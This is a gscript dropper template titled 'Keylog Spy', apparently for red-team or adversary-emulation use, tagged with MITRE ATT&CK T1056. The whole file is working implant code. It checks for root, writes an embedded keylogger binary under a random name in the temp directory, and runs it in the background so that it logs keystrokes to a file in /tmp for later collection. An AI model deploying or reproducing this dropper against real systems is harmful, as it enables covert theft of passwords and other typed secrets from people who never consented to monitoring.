// Example gscript template
// Title: Keylog Spy
// Author: ahhh, modified by heywoodlh
// Purpose: Starts recording keylogs, saves them in /tmp/27503ks
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Tactic: Later check location of output log to retrieve keylogs
// Uses: simple key keylogger https://github.com/gsingh93/simple-key-logger
// Note: must be run as root

//priority:150
//timeout:150

//go_import:os as os2
//go_import:os/user as user2

//import:resources/skeylogger64


function Deploy() {  
    console.log("starting execution of keylogger spy");
    // Getting our asset
    var keylogBin = GetAssetAsBytes("skeylogger64");
    console.log("errors: "+Dump(keylogBin[1]));
    // get user homedir
    var user = user2.Current();
    console.log("User: "+user[0].Username);
    if (user[0].Username == "root") {
        // Getting a random string
        var temppath = os2.TempDir();
        var naming = G.rand.GetAlphaString(4);
        var name = naming.toLowerCase();
        name = temppath+"/"+name;
        G.file.WriteFileFromBytes(name, keylogBin[0]);
        console.log("dropped the spy binary here: "+name); 
        G.exec.ExecuteCommandAsync(name, ["--logfile", "/tmp/27503ks"]);
    } else {
        console.log("Must be run as root");
	return false;
    }
    console.log("Loaded keylogger");
    return true;
  }
  
